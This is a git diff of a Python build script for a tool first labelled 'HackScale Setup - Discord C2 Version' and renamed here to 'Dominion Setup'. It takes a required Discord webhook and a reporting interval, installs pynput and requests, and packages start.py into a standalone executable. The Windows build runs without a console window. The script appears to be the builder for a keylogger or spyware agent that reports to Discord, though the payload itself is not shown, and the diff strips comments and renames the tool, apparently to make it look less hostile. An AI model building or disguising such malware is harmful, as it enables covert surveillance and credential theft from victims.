@@ -6,7 +6,8 @@ import subprocess
 import argparse
 from shutil import which
 
-# ==========================================
+
+
 def check_installed(program):
     return which(program) is not None
 
@@ -17,7 +18,8 @@ def install_linux_pyinstaller():
     subprocess.run(["pip3", "install", "--upgrade", "pip"])
     subprocess.run(["pip3", "install", "pyinstaller", "pynput", "thread6", "requests"])
 
-# ==========================================
+
+
 def find_wine_python311():
     possible_paths = [
         "C:\\Python311\\python.exe",
@@ -31,9 +33,10 @@ def find_wine_python311():
             return path
     return None
 
-# ==========================================
+
+
 def main():
-    parser = argparse.ArgumentParser(description="HackScale Setup - Discord C2 Version")
+    parser = argparse.ArgumentParser(description="Dominion Setup")
     parser.add_argument("--webhook", required=True, help="Discord webhook URL")
     parser.add_argument("--interval", required=False, type=int, default=60, help="Reporting interval (sec)")
     parser.add_argument("--windows", action="store_true", help="Build Windows EXE with Wine Python 3.11")
@@ -51,7 +54,8 @@ def main():
         print("[-] Please specify --windows or --linux")
         sys.exit(1)
 
-    # ==========================================
+
+
     if args.windows:
         print("[+] Target: Windows")
 
@@ -88,7 +92,9 @@ def main():
         print("[+] Building Windows EXE...")
         subprocess.run(["wine", wine_python, "-m", "PyInstaller", "--onefile", "--clean", "--noconsole", "start.py"])
 
-    # ==========================================
+
+
+
     if args.linux:
         print("[+] Target: Linux")
 
@@ -96,13 +102,14 @@ def main():
             print("[-] PyInstaller not found. Installing now...")
             install_linux_pyinstaller()
         else:
-            subprocess.run(["pip3", "install", "pynput", "thread6", "requests"])
+            subprocess.run(["pip3", "install", "pynput", "thread6", "requests", "--break-system-packages"])
 
         print("[+] Building Linux binary...")
         subprocess.run(["pyinstaller", "--onefile", "start.py"])
 
     print("[+] All done! Check /dist/ for your output.")
 
-# ==========================================
+
+
 if __name__ == "__main__":
     main()
